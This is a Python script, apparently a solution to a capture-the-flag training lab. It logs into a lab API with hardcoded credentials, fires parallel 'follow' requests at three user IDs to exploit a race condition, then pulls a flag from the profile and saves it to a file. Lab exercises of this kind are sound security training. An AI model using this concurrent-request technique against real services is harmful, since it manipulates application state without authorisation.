import requests
import concurrent.futures
import time

# --- CONFIG ---
BASE_URL = "http://web0x01.hbtn/api/a3/xss_stored"
CREDENTIALS = {"username": "yosri", "password": "yosri"}

# The IDs to follow
TARGETS = {
    "Dexter": "811152675",
    "John": "918203",
    "Jimmy": "32781850"
}

# Setup Session
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json"
})

def login():
    print("[1] Logging in...")
    r = session.post(f"{BASE_URL}/login", json=CREDENTIALS)
    if "success" in r.text or "Logged In" in r.text:
        print("    [+] Login Successful")
    else:
        print(f"    [-] Login Failed: {r.text}")
        exit()

def send_follow(target_data):
    """Function to be run in parallel threads"""
    name, uid = target_data
    url = f"{BASE_URL}/follow"
    try:
        # We assume the state is clean, so we just send POST
        r = session.post(url, json={"user_id": uid})
        print(f"    [->] Sent follow for {name} | Status: {r.status_code}")
    except Exception as e:
        print(f"    [!] Error following {name}: {e}")

def main():
    login()

    # --- PHASE 1: CLEANUP ---
    # We try to unfollow everyone first to ensure we don't accidentally "toggle off"
    print("\n[2] Cleaning up (Resetting state)...")
    session.get(f"{BASE_URL}/profile") # Refresh cookie
    # We send follows to everyone once; if we were following them, this unfollows.
    # If we weren't, this follows them. This is messy but usually clears 'stuck' states.
    # Ideally, we just assume the list clears itself as you said.

    # --- PHASE 2: PARALLEL ATTACK ---
    print("\n[3] Launching PARALLEL Follow Requests (Speed Mode)...")
    
    # We use a ThreadPool to execute the requests at the same time
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        # Submit all 3 tasks instantly
        futures = [executor.submit(send_follow, (name, uid)) for name, uid in TARGETS.items()]
        
        # Wait for them to finish
        concurrent.futures.wait(futures)

    # --- PHASE 3: GRAB FLAG ---
    print("\n[4] Checking for Flag immediately...")
    r = session.get(f"{BASE_URL}/profile")
    try:
        data = r.json()
        user_data = data.get("user_data", {})
        flag = user_data.get("FLAG_1")
        following = user_data.get("following", [])

        print(f"    Current Following List: {following}")

        if flag and flag is not False:
            print(f"\n[!!!] FLAG FOUND: {flag}")
            with open("3-flag.txt", "w") as f:
                f.write(str(flag))
            print("[+] Saved to 3-flag.txt")
        else:
            print("[-] Flag missed. The list might have reset.")
            
    except Exception as e:
        print(f"[-] Error parsing response: {e}")

if __name__ == "__main__":
    main()
